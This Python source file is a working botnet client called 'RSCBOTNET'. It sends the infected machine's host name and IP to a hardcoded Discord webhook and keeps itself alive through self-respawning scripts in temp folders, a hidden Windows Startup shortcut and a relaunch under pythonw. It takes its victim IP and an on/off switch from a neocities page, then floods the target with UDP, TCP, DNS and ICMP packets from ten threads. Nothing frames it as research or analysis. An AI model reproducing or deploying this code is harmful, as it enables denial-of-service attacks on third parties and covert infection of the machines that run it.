import os
import sys
import threading
import random
import socket
import re
import time
import subprocess
import http.client
import psutil
import win32com.client
from discord_webhook import DiscordWebhook, DiscordEmbed

def send_system_info_to_discord():
    try:
        # Obtener información del sistema
        host_name = socket.gethostname()  # Nombre del host
        ip_address = socket.gethostbyname(host_name)  # IP asociada al host
        
        # Preparar el contenido del mensaje
        content = f"**Información del sistema**\n"
        content += f"**Host Name:** {host_name}\n"
        content += f"**IP Address:** {ip_address}\n"
        content += f"**Additional Info:** Custom message or logs can be added here."
        
        # URL del webhook
        webhook_url = "https://discord.com/api/webhooks/1344334763904860223/dHcKxkd_uy2YDnnIhvNiu7Y4rwRlPmICBsoQc2MVBHdpKBGp6kp0EF2nJjFaqdjKHZ9_"
        
        # Enviar el mensaje al webhook de Discord
        webhook = DiscordWebhook(url=webhook_url, username="RSCBOTNET", content=content)
        response = webhook.execute()
        
        # Verificar si el mensaje fue enviado correctamente
        if response.status_code == 200:
            print("Mensaje enviado correctamente a Discord.")
        else:
            print(f"Error al enviar el webhook. Código de estado: {response.status_code}")
    
    except Exception as e:
        print(f"Error: {e}")

    send_system_info_to_discord() 

def install_dependencies():
    try:
        import psutil
        import win32com.client
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "psutil", "pywin32"])

install_dependencies()

# Original script name that should remain active
SCRIPT_ORIGINAL = "rscbotnet.py"

# Potential directories where the files can be placed
DIRECTORIES = ["/tmp", "/var/tmp", os.path.expanduser("~/"), "/dev/shm"]

def get_random_path():
    """Generates a random path in a valid directory."""
    directory = random.choice(DIRECTORIES)
    filename = "monolith.py"
    return os.path.join(directory, filename)

PERSISTENCE_CODE = f"""
import os
import time
import subprocess

SCRIPT = "{SCRIPT_ORIGINAL}"

def run_script():
    while True:
        if not is_process_active(SCRIPT):
            subprocess.Popen(["python3", SCRIPT])
        time.sleep(5)

def is_process_active(script):
    try:
        output = subprocess.check_output(["pgrep", "-f", script])
        return bool(output.strip())
    except subprocess.CalledProcessError:
        return False

run_script()
"""

def create_persistent_files():
    """Creates and runs three persistent files in random locations."""
    paths = [get_random_path() for _ in range(3)]
    
    for path in paths:
        with open(path, "w") as f:
            f.write(PERSISTENCE_CODE)
        os.chmod(path, 0o755)  # Make the file executable
        subprocess.Popen(["python3", path])  # Run the script

    return paths

def activate_persistence():
    """Starts persistence by regenerating files every 3 seconds in a separate thread."""
    def persistence():
        while True:
            paths = create_persistent_files()
            time.sleep(3)

            # Remove old files before regenerating them
            for path in paths:
                if os.path.exists(path):
                    os.remove(path)

    thread = threading.Thread(target=persistence, daemon=True)
    thread.start()

activate_persistence()


num_bots = 10
running = True
data_limit = 1 * 1024**4
attack_type = "BOTH"

previous_note_content = ""
previous_victim_ip = ""

# Function to fetch the target IP without using 'requests'
def fetch_target_ip():
    try:
        conn = http.client.HTTPSConnection("rsc-site.neocities.org")
        conn.request("GET", "/victim")
        response = conn.getresponse()
        content = response.read().decode()
        conn.close()

        ip_address = re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", content)
        if ip_address:
            print(f"Target IP obtained: {ip_address[0]}")
            return ip_address[0]
        else:
            print("No valid IP found.")
            return None
    except Exception as e:
        print("Error obtaining target IP:", e)
        return None

# Function to check if attack is enabled without using 'requests'
def is_attack_enabled():
    try:
        conn = http.client.HTTPSConnection("rsc-site.neocities.org")
        conn.request("GET", "/note")
        response = conn.getresponse()
        content = response.read().decode()
        conn.close()

        enabled = "true" in content.lower()
        print(f"Enabled status: {enabled}")
        return enabled
    except Exception as e:
        print("Error checking enabled status:", e)
        return False

# Attack function
def attack(bot_id, target_ip, packet_size=10240):
    total_data_sent = 0
    global running
    print(f"Bot {bot_id} starting attack in mode {attack_type} on {target_ip}")
    
    while total_data_sent < data_limit and running:
        try:
            random_port = random.randint(1, 65535)
            packet = random._urandom(packet_size)

            if attack_type in ("UDP", "BOTH", "VOLUMETRIC"):
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as udp_socket:
                    udp_socket.sendto(packet, (target_ip, random_port))
                    total_data_sent += len(packet)

            if attack_type in ("TCP", "BOTH", "VOLUMETRIC"):
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tcp_socket:
                    tcp_socket.settimeout(0.5)
                    try:
                        tcp_socket.connect((target_ip, random_port))
                        tcp_socket.send(packet)
                        total_data_sent += len(packet)
                    except Exception as e:
                            print(f"Bot {bot_id}: Failed to connect after attempts.")
                    finally:
                        tcp_socket.close()

            if attack_type == "DNS":
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as dns_socket:
                    dns_request = b"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01"
                    dns_socket.sendto(dns_request, (target_ip, 53))
                    total_data_sent += len(dns_request)

            if attack_type == "ICMP":
                with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as icmp_socket:
                    icmp_packet = b"\x08\x00\xf7\xff" + random._urandom(packet_size - 4)
                    icmp_socket.sendto(icmp_packet, (target_ip, 0))
                    total_data_sent += len(icmp_packet)

            if attack_type == "DYN":
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as dyn_socket:
                    amp_request = b"\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01"
                    dyn_socket.sendto(amp_request, (target_ip, 53))
                    total_data_sent += len(amp_request)

        except Exception as e:
            print(f"Bot {bot_id}: Error -", e)

def run_attack():
    global previous_note_content, previous_victim_ip
    while True:
        try:
            current_attack_enabled = is_attack_enabled()
            current_victim_ip = fetch_target_ip()

            if current_attack_enabled and current_victim_ip:
                if current_victim_ip != previous_victim_ip or current_attack_enabled != (previous_note_content == "true"):
                    previous_note_content = "true" if current_attack_enabled else "false"
                    previous_victim_ip = current_victim_ip
                    
                    print("Starting attack due to detected changes.")
                    threads = []
                    for i in range(num_bots):
                        bot_thread = threading.Thread(target=attack, args=(i, current_victim_ip))
                        threads.append(bot_thread)
                        bot_thread.start()

                    for thread in threads:
                        thread.join()
                else:
                    print("Conditions met but no changes detected since last run.")
            else:
                print("Conditions not met for the attack.")
            time.sleep(3)
        except Exception as e:
            print("Error in verification or attack execution:", e)

def is_running_in_background():
    current_pid = os.getpid()
    for process in psutil.process_iter(['pid', 'name', 'cmdline']):
        try:
            if process.info['pid'] != current_pid and process.info['cmdline'] and os.path.abspath(__file__) in process.info['cmdline']:
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    return False

def run_with_pythonw():
    if sys.platform == "win32" and "python.exe" in sys.executable:
        pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
        subprocess.Popen([pythonw_path, os.path.abspath(__file__)])
        sys.exit()

def add_to_startup():
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    script_path = os.path.abspath(__file__)
    pythonw_path = sys.executable.replace("python.exe", "pythonw.exe")
    shortcut_path = os.path.join(startup_folder, 'rscbotnet.lnk')

    if os.path.exists(shortcut_path):
        print("Program is already set for automatic startup.")
        return

    try:
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortcut(shortcut_path)
        shortcut.TargetPath = pythonw_path
        shortcut.Arguments = f'"{script_path}"'
        shortcut.WorkingDirectory = os.path.dirname(script_path)
        shortcut.IconLocation = script_path
        shortcut.save()
        print("Program is set for automatic startup.")
    except Exception as e:
        print("Error in automatic startup:", e)

if __name__ == "__main__":
    add_to_startup()  
    run_with_pythonw() 
    if not is_running_in_background():
        run_attack()
    else:
        print("The script is already running in the background.")
